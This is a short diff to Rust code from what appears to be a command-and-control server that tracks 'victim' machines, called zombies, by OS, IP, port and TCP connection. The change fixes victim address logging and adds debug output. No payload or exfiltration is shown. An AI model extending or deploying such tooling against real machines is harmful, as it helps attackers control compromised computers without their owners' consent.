@@ -1,6 +1,8 @@
+use std::fmt::Debug;
 use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
 use log::debug;
 
+#[derive(Debug)]
 pub enum System {
     Windows,
     Linux,
@@ -9,9 +11,11 @@ pub enum System {
 }
 
 /// Zombie is victim machine.
+#[derive(Debug)]
 pub struct Zombie {
     pub system: System,
     pub ip: IpAddr,
+    pub port: u16,
     tcp_stream: TcpStream
 }
 
@@ -24,7 +28,8 @@ impl Zombie {
         Ok(
             Zombie {
                 system: find_system(&mut connection),
-                ip: connection.local_addr()?.ip(),
+                ip: connection.peer_addr()?.ip(),
+                port: connection.peer_addr()?.port(),
                 tcp_stream: connection
             }
         )
